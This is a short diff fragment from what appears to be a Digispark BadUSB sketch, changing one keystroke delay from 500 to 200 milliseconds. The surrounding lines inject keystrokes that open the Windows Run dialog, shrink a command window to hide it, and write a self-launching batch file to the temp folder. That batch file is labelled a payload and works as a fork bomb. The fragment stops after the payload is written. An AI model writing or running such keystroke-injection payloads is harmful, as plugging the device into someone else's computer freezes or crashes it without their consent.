@@ -10,7 +10,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(2000);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(200);
   DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
   DigiKeyboard.delay(500);
   DigiKeyboard.println("(echo :ouch && echo start ouch.bat && echo goto ouch) > %temp%/ouch.bat"); //Creating payload in temporary dir
